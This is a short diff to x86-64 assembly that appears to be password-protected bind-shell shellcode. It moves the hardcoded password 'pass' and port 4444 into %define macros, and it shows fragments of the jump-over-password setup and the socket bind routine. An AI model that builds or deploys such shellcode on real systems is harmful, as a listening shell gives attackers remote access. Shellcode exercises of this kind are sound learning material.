@@ -1,9 +1,12 @@
 global _start
 
+%define pass "pass"
+%define port 0x5c11  ; htons(4444)
+
 %define _START
 _start:
     jmp real_start
-    password: db "pass"
+    password: db pass
     pass_len: db $-password
 
 real_start:
@@ -50,7 +53,7 @@ bind:
     push rax      ; sin_zero
     push ax
     push ax       ; sin_addr
-    push word 0x5c11  ; htons(4444)
+    push word port
     push word 2
 
     ; bind
